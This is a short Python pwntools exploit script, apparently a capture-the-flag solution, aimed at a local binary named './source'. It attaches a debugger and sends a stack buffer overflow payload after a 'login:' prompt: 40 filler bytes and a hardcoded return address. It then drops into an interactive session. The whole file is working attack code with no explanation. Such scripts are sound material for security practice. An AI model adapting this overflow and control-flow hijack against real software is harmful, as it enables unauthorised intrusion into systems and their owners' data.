from pwn import *
elf = context.binary = ELF("./source")
r = elf.process()
gdb.attach(r, '''
    b* main+154\n
    c
''')
payload = b"a"*40 + p64(0x000000000040115e)
r.sendlineafter(b"login:", payload)

r.interactive()